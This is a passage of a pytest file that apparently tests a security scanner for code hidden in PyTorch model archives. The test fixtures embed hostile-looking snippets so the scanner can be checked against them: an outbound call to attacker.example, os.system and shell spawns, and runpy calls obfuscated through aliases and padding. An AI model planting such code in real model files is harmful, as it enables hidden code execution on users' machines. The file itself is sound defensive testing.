        for check in result.checks
    )


def test_pytorch_zip_jit_detector_exception_marks_scan_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "jit-detector-error.pt", prefix="archive")

    def raise_detector_error(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise RuntimeError("JIT detector failed")

    monkeypatch.setattr("modelaudit.detectors.jit_script.JITScriptDetector.scan_model", raise_detector_error)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "raw_detector_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
    coverage_checks = [
        check
        for check in result.checks
        if check.name == "Raw Detector Analysis Coverage" and check.details.get("detector") == "jit_script"
    ]
    assert len(coverage_checks) == 1
    assert coverage_checks[0].details["analysis_incomplete"] is True
    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.PASSED
        and check.location == str(model_path)
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("disabled_config", "disabled_collector", "disabled_check"),
    [
        ("check_jit_script", "collect_jit_script_findings", "JIT/Script Code Execution Detection"),
        ("check_network_comm", "collect_network_communication_findings", "Network Communication Detection"),
    ],
)
def test_pytorch_zip_does_not_invoke_disabled_raw_detector_collector(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    disabled_config: str,
    disabled_collector: str,
    disabled_check: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"disabled-{disabled_config}.pt", prefix="archive")

    def fail_if_called(*_args: object, **_kwargs: object) -> list[dict[str, object]]:
        raise AssertionError(f"disabled collector {disabled_collector} was invoked")

    monkeypatch.setattr(PyTorchZipScanner, disabled_collector, fail_if_called)

    result = PyTorchZipScanner(config={disabled_config: False}).scan(str(model_path))

    assert result.success is True
    assert "raw_detector_analysis_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert disabled_check in result.metadata["disabled_checks"]


def test_pytorch_zip_jit_scan_uses_pickle_entry_identity_for_duplicate_names(tmp_path: Path) -> None:
    model_path = tmp_path / "duplicate_source_name.pt"
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(model_path, "w") as zip_file:
            zip_file.writestr("archive/version", "3\n")
            zip_file.writestr("archive/byteorder", "little")
            zip_file.writestr("archive/code/payload.py", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
            zip_file.writestr(
                "archive/code/payload.py",
                b"import urllib.request\nurllib.request.urlopen('http://attacker.example/model')\n",
            )

    result = PyTorchZipScanner().scan(str(model_path))

    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/code/payload.py" for check in network_failures)


@pytest.mark.performance
def test_pytorch_zip_skips_numeric_data_files(tmp_path):
    """Test that numeric tensor data files in archive/data/ are skipped during JIT scanning."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Add numeric tensor data files (these should be skipped)
        # Create a large-ish binary file to simulate real tensor data
        large_binary_data = b"\x00" * 10_000_000  # 10MB of zeros
        zipf.writestr("archive/data/0", large_binary_data)
        zipf.writestr("archive/data/1", large_binary_data)
        zipf.writestr("archive/data/123", large_binary_data)

    scanner = PyTorchZipScanner()

    # Measure scan time - should be fast since numeric files are skipped
    start_time = time.time()
    result = scanner.scan(str(zip_path))
    elapsed_time = time.time() - start_time

    # CI timing can vary significantly by runner and OS; keep a conservative
    # upper bound that still catches pathological regressions.
    max_expected_seconds = 20.0
    assert elapsed_time < max_expected_seconds, f"Scan took {elapsed_time:.2f}s, expected < {max_expected_seconds:.0f}s"
    assert result.success is True


def test_pytorch_zip_scans_non_numeric_files_in_archive_data(tmp_path: Path) -> None:
    """Test that non-numeric files in archive/data/ are still scanned for security."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Add a non-numeric file with suspicious content in archive/data/
        # This should NOT be skipped
        malicious_code = b"import os; os.system('whoami')"
        zipf.writestr("archive/data/malicious.py", malicious_code)

        # Add a numeric file (should be skipped)
        zipf.writestr("archive/data/0", b"\x00" * 1000)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    python_file_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert python_file_failures
    assert any(check.location == f"{zip_path}:archive/data/malicious.py" for check in python_file_failures)


def test_pytorch_zip_scans_unmarked_python_blobs_in_archive_data(tmp_path: Path) -> None:
    """A disguised Python source blob in archive/data/ must still reach the JIT detector."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr(
            "archive/data/payload.bin",
            b"""
            def payload():
                import os
                return os.system("id")
            """,
        )

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert jit_failures
    assert any(check.location == f"{zip_path}:archive/data/payload.bin" for check in jit_failures)


def test_pytorch_zip_redacts_secret_bearing_jit_code_snippets(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    secret = "SECRETKEY1234567890"
    payload = f"""
    def payload():
        os.environ["AWS_SECRET_ACCESS_KEY"] = "{secret}"
        return eval("1 + 1")
    """.encode()
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    serialized = result.to_json()
    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert secret not in serialized
    assert any(
        check.details.get("code_snippet")
        and 'os.environ["AWS_SECRET_ACCESS_KEY"] = "<redacted>"' in check.details["code_snippet"]
        and 'eval("1 + 1")' in check.details["code_snippet"]
        for check in jit_failures
    )


def test_pytorch_zip_redacts_signed_urls_in_explicit_network_findings(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    token = "TOP_SECRET_QUERY"
    signature = "SIGSECRET1234567890"
    payload = f"callback = 'https://collector.example/upload?token={token}&X-Amz-Signature={signature}'\n"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/code/__torch__/payload.py", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    serialized = result.to_json()
    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    explicit_failure = next(
        check for check in network_failures if check.details.get("type") == "explicit_network_pattern"
    )
    assert token not in serialized
    assert signature not in serialized
    assert explicit_failure.details["matched_text"] == "https://collector.example/upload"
    assert explicit_failure.message == "Explicit network pattern in ML model: https://collector.example/upload"


@pytest.mark.parametrize(
    "payload",
    [
        b"def payload():\n    return os.posix_spawn('/bin/sh', ['sh'], {})\n",
        b"def payload():\n    return os.posix_spawnp('sh', ['sh'], {})\n",
        b"def payload():\n    return os.startfile('payload.exe')\n",
        b"def payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
        (b"\x00\xffimport os\ndef payload():\n    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n}"),
        b"def payload():\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
        b"def payload(data):\n    os.posix_spawn = pickle.loads\n    return os.posix_spawn(data)\n",
    ],
)
def test_pytorch_zip_scans_os_process_launch_source_conservatively(tmp_path: Path, payload: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(
        check.location == f"{zip_path}:archive/data/payload.bin" and "OS command execution detected" in check.message
        for check in jit_failures
    )


def test_pytorch_zip_allows_framed_benign_dict_literal_os_accessor(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    payload = b"\x00\xffdef payload():\n    import os\n    return {'cwd': getattr(os, 'getcwd')()}\n}"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and "OS command execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_ignores_binary_framed_string_literal_os_process_launch(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    payload = b"\x00\xffdef payload():\n    return \"os.posix_spawn('/bin/sh', ['sh'], {})\"\n}"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and "OS command execution detected" in check.message
        for check in result.checks
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"async def payload():\n    return await asyncio.create_subprocess_shell('id')\n",
        b"async def payload():\n    return await asyncio.subprocess.create_subprocess_exec('id')\n",
        (
            b"from asyncio import create_subprocess_exec as launch\n"
            b"async def payload():\n    return await launch('id')\n"
        ),
        (
            b"\x00\xffdef payload():\n"
            b"    from asyncio import create_subprocess_shell as launch\n"
            b"    return launch('id')\n"
            b"}"
        ),
    ],
)
def test_pytorch_zip_scans_asyncio_subprocess_launch_source_conservatively(tmp_path: Path, payload: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(
        check.location == f"{zip_path}:archive/data/payload.bin" and "Subprocess execution detected" in check.message
        for check in jit_failures
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"def payload():\n    return runpy._run_module_as_main('payload')\n",
        b"def payload():\n    return runpy.run_module('payload')\n",
        b"def payload():\n    from runpy import run_path as run\n    return run('payload.py')\n",
        (b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n}"),
        b"\x00\xfffrom runpy import _run_module_as_main as run\nrun('payload')\n\x00MODEL-FRAMING",
    ],
)
def test_pytorch_zip_scans_unmarked_runpy_execution_in_archive_data(tmp_path: Path, payload: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    matching_failures = [
        check
        for check in jit_failures
        if check.location == f"{zip_path}:archive/data/payload.bin"
        and "Dynamic module execution detected" in check.message
    ]
    assert matching_failures
    assert all(check.rule_code == "S108" for check in matching_failures)


@pytest.mark.parametrize(
    "call",
    [
        b"(\n runner\n)('payload.py')\n",
        b"(\n runner\n) \\\n('payload.py')\n",
        b"runner \\\n('payload.py')\n",
        b"rp \\\n    .run_path('payload.py')\n",
    ],
)
def test_pytorch_zip_scans_late_continued_runpy_alias_in_archive_data(tmp_path: Path, call: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    import_line = b"import runpy as rp\n" if call.startswith(b"rp ") else b"from runpy import run_path as runner\n"
    payload = b"\x00\xff" + leading_blocks + import_line + padding
    payload += call + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


@pytest.mark.parametrize("call", [b"(\n runner\n)('safe')\n", b"runner \\\n('safe')\n"])
def test_pytorch_zip_preserves_visible_safe_rebind_before_late_continued_alias_call(
    tmp_path: Path, call: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n" + padding
    payload += b"runner = print\n" + call + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("late_bindings", "call"),
    [
        (b"runner = rp.run_path\n", b"runner('payload.py')\n"),
        (b"runner = rp.run_path\n", b"(runner)('payload.py')\n"),
        (b"runner = rp.run_path\n", b"(\n runner\n)('payload.py')\n"),
        (b"runner = rp.run_path\n", b"runner \\\n('payload.py')\n"),
        (b"first = rp.run_path\nrunner = first\n", b"(runner)('payload.py')\n"),
        (b"enabled = True\nrunner = rp.run_path if enabled else print\n", b"(runner)('payload.py')\n"),
        (b"runner = rp.run_path or print\n", b"(runner)('payload.py')\n"),
        (b"runner = False or rp.run_path\n", b"(runner)('payload.py')\n"),
        (
            b"enabled = True\nrunner = (\n    rp.run_path\n    if enabled\n    else print\n)\n",
            b"(runner)('payload.py')\n",
        ),
        (b"mod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
        (b"\x00\xffmod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
    ],
)
def test_pytorch_zip_scans_late_derived_runpy_alias_in_archive_data(
    tmp_path: Path, late_bindings: bytes, call: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + late_bindings + call + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_scans_long_late_derived_runpy_alias_chain_with_bounded_replay(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    bindings = b"value_0 = rp.run_path\n" + b"".join(
        f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
    )
    payload = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('payload.py')\n" + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("priority_import", "call_line"),
    [
        (b"import runpy as rp\n", b"rp.run_path.__call__('payload.py')\n"),
        (b"import runpy as rp\n", b"(rp.run_path).__call__('payload.py')\n"),
        (b"import runpy as rp\n", b"(\n rp.run_path\n).__call__('payload.py')\n"),
        (b"import runpy as rp\n", b"rp.run_path.__call__(\n    'payload.py'\n)\n"),
        (b"import runpy as rp\n", b"(\n    rp.run_path\n) \\\n.__call__('payload.py')\n"),
        (b"import runpy as rp\n", b"rp.run_path.\\\n__call__('payload.py')\n"),
        (b"import runpy as rp\n", b"(\n    rp.run_path  # callable\n    .__call__('payload.py')\n)\n"),
        (b"import runpy as rp\n", b"(\n    rp.run_path.__call__  # invoke\n    ('payload.py')\n)\n"),
        (b"import runpy as rp\n", b"(\n    (rp.run_path)  # callable\n    .__call__('payload.py')\n)\n"),
        (b"from runpy import run_path as runner\n", b"runner.__call__.__call__(\n    'payload.py'\n)\n"),
        (b"import runpy as rp\n", b"getattr(rp.run_path, '__call__')('payload.py')\n"),
        (b"import runpy as rp\n", b"getattr(\n    rp.run_path,\n    '__call__'\n)(\n    'payload.py'\n)\n"),
    ],
)
def test_pytorch_zip_detects_long_explicit_runpy_dunder_call_with_bounded_replay(
    tmp_path: Path, priority_import: bytes, call_line: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
    payload = b"\x00\xff" + priority_import + padding + call_line + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_ignores_long_passive_runpy_reference_chain_with_bounded_replay(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    bindings = b"value_0 = print(rp.run_path)\n" + b"".join(
        f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
    )
    payload = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('safe')\n" + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize("safe_rebind", [b"runner = (\n    print\n)\n", b"runner = \\\n    print\n"])
def test_pytorch_zip_preserves_multiline_safe_rebind_before_late_parenthesized_alias_call(
    tmp_path: Path, safe_rebind: bytes
) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = (
        b"\x00\xff"
        + leading_blocks
        + b"from runpy import run_path as runner\n"
        + padding
        + safe_rebind
        + b"(runner)('safe')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


def test_pytorch_zip_scans_parenthesized_runpy_alias_after_passive_member_budget(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
    payload = (
        b"\x00\xff"
        + leading_blocks
        + b"import runpy as rp\n"
        + padding
        + passive_members
        + b"((rp).run_path)('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        and "Dynamic module execution detected" in check.message
        for check in result.checks
    )


def test_pytorch_zip_preserves_safe_member_overwrite_after_passive_alias_members(tmp_path: Path) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    passive_members = b"".join(f"rp.mark_{index} = {index}\n".encode() for index in range(8))
    payload = (
        b"\x00\xffimport runpy as rp\n"
        + padding
        + passive_members
        + b"rp.run_path = print\n"
        + passive_members
        + b"((rp).run_path)('safe')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    ("late_state", "expect_finding"),
    [
        (b"if False:\n    runner = print\n(runner)('payload.py')\n", True),
        (b"if True:\n    runner = print\n(runner)('safe')\n", False),
        (b"if True:\n    runner = original\n(runner)('payload.py')\n", True),
    ],
)
def test_pytorch_zip_handles_constant_guarded_late_runpy_alias_binding(
    tmp_path: Path, late_state: bytes, expect_finding: bool
) -> None:
    zip_path = tmp_path / "model.pt"
    leading_blocks = b"".join(
        f"def benign_{index}():\n    return {index}\n}}\x00".encode()
        for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
    )
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    prefix = b"\x00\xff" + leading_blocks + b"from runpy import run_path as runner\n"
    if b"original" in late_state:
        prefix += b"original = runner\nrunner = print\n"
    payload = prefix + padding + late_state + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))
    has_dynamic_failure = any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )

    assert has_dynamic_failure is expect_finding


@pytest.mark.parametrize("shadow", [b"class runner:\n    pass\n", b"del runner\n"])
def test_pytorch_zip_preserves_definite_late_runpy_alias_shadow(tmp_path: Path, shadow: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = b"\x00\xfffrom runpy import run_path as runner\n" + padding + shadow + b"(runner)('safe')\n" + padding
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "restore",
    [
        b"if False:\n    pass\nelse:\n    runner = original\n",
        b"if True:\n    if True:\n        runner = original\n",
    ],
)
def test_pytorch_zip_detects_compound_late_runpy_alias_restore(tmp_path: Path, restore: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    padding_line = b"# pad\n"
    padding = padding_line * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8)
    payload = (
        b"\x00\xfffrom runpy import run_path as runner\n"
        + b"original = runner\nrunner = print\n"
        + padding
        + restore
        + b"(runner)('payload.py')\n"
        + padding
    )
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        check.name == "JIT/Script Code Execution Detection"
        and check.status == CheckStatus.FAILED
        and check.location == f"{zip_path}:archive/data/payload.bin"
        and check.rule_code == "S108"
        for check in result.checks
    )


@pytest.mark.parametrize(
    "late_state",
    [
        b"runner = rp.run_path if False else print\n(runner)('safe')\n",
        b"runner = print if 1 else rp.run_path\n(runner)('safe')\n",
        b"runner = rp.run_path and print\n(runner)('safe')\n",
        b"runner = True or rp.run_path\n(runner)('safe')\n",
        b"runner = print or rp.run_path\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif False:\n    if True:\n        runner = original\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif True:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif 1:\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif False:\n    pass\nelif True:\n    pass\nelse:\n"
        + b"    runner = original\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif 'enabled':\n    pass\nelse:\n    runner = original\n(runner)('safe')\n",
        b"original = runner\nrunner = print\nif True:\n    pass\nelif False:\n    pass\nelse:\n"
        + b"    runner = original\n(runner)('safe')\n",
        b"if globals().get('enabled'):\n    runner = print\nelif True:\n    runner = print\n(runner)('safe')\n",
        b"getattr(object=rp, name='run_path')('safe')\n",
    ],
)
def test_pytorch_zip_preserves_definitely_safe_late_conditional_alias_state(tmp_path: Path, late_state: bytes) -> None:
    zip_path = tmp_path / "model.pt"
